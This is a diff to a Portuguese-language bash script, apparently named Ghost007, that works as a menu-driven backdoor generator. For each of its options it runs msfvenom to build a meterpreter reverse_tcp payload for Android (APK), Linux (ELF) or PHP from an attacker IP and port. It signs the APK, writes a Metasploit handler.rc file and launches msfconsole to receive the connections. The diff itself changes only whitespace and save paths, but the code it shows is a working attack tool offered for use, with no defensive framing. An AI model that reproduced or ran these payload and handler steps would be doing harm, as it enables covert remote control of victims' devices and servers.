@@ -19,11 +19,15 @@ touch requisitos/handler.rc > /dev/null
 clear
 
 printf "$red"
+
 cat requisitos/banner.txt
+
 printf "$end"
 
 printf "\n"
+
 printf "$green"
+
 sleep 0.1
 printf "{0} sair do script				{4} backdoor em php \n"
 sleep 0.1
@@ -33,9 +37,11 @@ printf "{2} criar backdoor para android \n"
 sleep 0.1
 printf "{3} criar backdoor para linux \n"
 printf "\n"
+
 read -p "Escolha uma opcão: " opcao
 
 case "$opcao" in
+
 	0)
 		printf "tchau ( ^_^)／"
 		exit 1
@@ -46,6 +52,7 @@ case "$opcao" in
 	;;
 
 	2)
+
 		printf "${purple}Sem .apk\n"
                 read -p "Nome da backdoor: " nome2
                 read -p "[?] informe o ip que ira aguardar a conexão: " lhost2
@@ -55,7 +62,7 @@ case "$opcao" in
 		printf "${blue}[i] lport=$lport2 ${end}\n"
                 printf "${green}[+] Criando Backdoor... \n"
                 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost2 LPORT=$lport2 -o $nome2.apk
-		echo "Backdoor salva em: creat-backdoor/$nome2.apk"
+		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome2.apk"
 		d2j-apk-sign $nome2.apk
 		rm $nome2.apk
 		mv $nome2-signed.apk $nome2.apk
@@ -66,10 +73,10 @@ case "$opcao" in
                 printf "set ExitOnSession false \n" >> requisitos/handler.rc
                 printf "run -j -z" >> requisitos/handler.rc
                 msfconsole -r requisitos/handler.rc
-
 	;;
 
 	3)
+
 		printf "${purple}Sem .elf\n"
                 read -p "Nome da backdoor: " nome3
                 read -p "[?] informe o ip que ira aguardar a conexão: " lhost3
@@ -79,7 +86,7 @@ case "$opcao" in
                 printf "${blue}[i] lport=$lport3 ${end}\n"
                 printf "${green}[+] Criando Backdoor...${end} \n"
                 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost3 LPORT=$lport3 -f elf -o $nome3.elf
-		echo "Backdoor salva em: creat-backdoor/$nome3.elf"
+		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome3.elf"
 		chmod +x $nome3.elf
 		printf "use exploit/multi/handler \n" > requisitos/handler.rc
 		printf "set payload linux/x86/meterpreter/reverse_tcp \n" >> requisitos/handler.rc
@@ -88,7 +95,6 @@ case "$opcao" in
                 printf "set ExitOnSession false \n" >> requisitos/handler.rc
                 printf "run -j -z" >> requisitos/handler.rc
                 msfconsole -r requisitos/handler.rc
-
 	;;
 
 	4)
@@ -101,7 +107,7 @@ case "$opcao" in
                 printf "${blue}[i] lport=$lport4 ${end}\n"
                 printf "${green}[+] Criando Backdoor...${end} \n"
                 msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost4 LPORT=$lport4 -o $nome4.php
-		echo "Backdoor salva em: creat-backdoor/$nome4.php"
+		echo "Backdoor salva em: Ghost007/requisitos/creat-backdoor/$nome4.php"
 		chmod +x $nome4.php
                 printf "use exploit/multi/handler \n" > requisitos/handler.rc
                 printf "set payload php/meterpreter/reverse_tcp \n" >> requisitos/handler.rc
@@ -116,4 +122,7 @@ case "$opcao" in
 		printf "${red}[!]Opção invalida${end}"
 	;;
 
+
+
 esac
+
